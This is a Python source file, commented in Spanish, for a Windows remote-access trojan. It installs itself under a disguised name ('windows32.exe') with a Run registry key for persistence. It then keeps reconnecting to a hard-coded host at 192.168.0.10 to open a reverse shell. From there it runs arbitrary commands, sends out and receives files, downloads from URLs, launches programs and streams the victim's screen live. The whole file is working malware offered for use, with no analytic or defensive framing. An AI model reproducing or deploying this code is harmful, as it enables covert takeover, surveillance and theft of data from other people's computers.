#!/usr/bin/env python
# _*_coding: utf8_*_
import socket
import os
import subprocess
import base64
import requests
import time
import pyautogui
import cv2
import numpy as np
import shutil
import sys
from vidstream import ScreenShareClient
import threading

#funcion de checar si hay privilegios administrativos------------------------------------------------------------
def admin_check():
    global admin
    try:
        check=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:/windows'),'temp']))
    except:
        admin='error, privilegios insuficientes'
    else:
        admin='privilegios de administrador'


#Funci칩n donde se crea la persistencia 
def create_persistence():
    location=os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v lagartcry /t REG_SZ /d "'+location +'"', shell=True)


#funcion de conexion al servidor------------------------------------------------------------
def connect_to_server():
    while True:
        try:
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cliente.connect(('192.168.0.10', 9999))
            return cliente
        except ConnectionRefusedError:
            print("El servidor no est치 disponible. Intentando de nuevo en 5 segundos...")
            time.sleep(5)


#Funcion para el get, descarga de webs------------------------------------------------------------
def download_file(url):
    consulta=requests.get(url)
    name_file=url.split('/')[-1]
    with open(name_file,'wb')as file_get:
        file_get.write(consulta.content)


#Funcion shell donde se configuran los comandos------------------------------------------------------------
def shell():
    current_dir = os.getcwd()
    cliente.send(current_dir.encode())
    while True:
        res = cliente.recv(1024).decode()
        if res == 'exit':
            break
        elif res[:2] == 'cd' and len(res) > 2:
            directory = res[3:]
            if os.path.exists(directory) and os.path.isdir(directory):
                os.chdir(directory)
                result = os.getcwd()
                cliente.send(result.encode())
            else:
                cliente.send(b'Directorio no encontrado')
        elif res[:8]=='download':
            with open(res[9:],'rb')as file_download:
                cliente.send(base64.b64encode(file_download.read()))
        elif res[:6]=='upload':
            with open(res[7:],'wb')as file_upload:
                datos=cliente.recv(300000)
                file_upload.write(base64.b64decode(datos))
        elif res[:3]=='get':
            try:
                download_file(res[4:])
                cliente.send(b'El archivo se descargo correctamente')
            except:
                cliente.send(b'Ocurrio un error en la descarga')
        elif res[:5]=='start':
            try:
                subprocess.Popen(res[6:],shell=True)
                cliente.send(b'programa iniciado con exito')
            except:
                cliente.send(b'no se pudo iniciar el programa')
        elif res[:5]=='check':
            try:
                admin_check()
                cliente.send(admin.encode())
            except:
                cliente.send(b'no se pudo realizar la tarea')
        elif res=='screenlive':
            sender=ScreenShareClient('192.168.0.10',8080)
            t=threading.Thread(target=sender.start_stream)
            t.start()

            while input('')!='STOP':
                continue
            sender.stop_stream()
            # Capturar el frame de la pantalla
            #screenshot = pyautogui.screenshot()
            #frame = np.array(screenshot)
            # Codificar el frame en formato de bytes
            #encoded_frame = cv2.imencode('.png', frame)[1].tobytes()
            # Obtener la longitud del frame codificado
            #frame_length = len(encoded_frame).to_bytes(4, byteorder='big')
            # Enviar la longitud del frame seguida del frame codificado
            #cliente.send(frame_length + encoded_frame)
        else:
            args = res.split()
            proc = subprocess.Popen(args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result)==0:
                cliente.send(b'1')
            else:
                cliente.send(result)


#Llamar la funcion de la persistencia------------------------------------------------------------
create_persistence()

#conectarte al servidor repetidas veces(aunque no este prendido el server)------------------------------------------------------------------------------
while True:
    try:
        cliente = connect_to_server()
        shell()
        cliente.close()
    except ConnectionResetError:
        print("La conexi칩n con el servidor se perdi칩. Intentando de nuevo en 5 segundos...")
        time.sleep(5)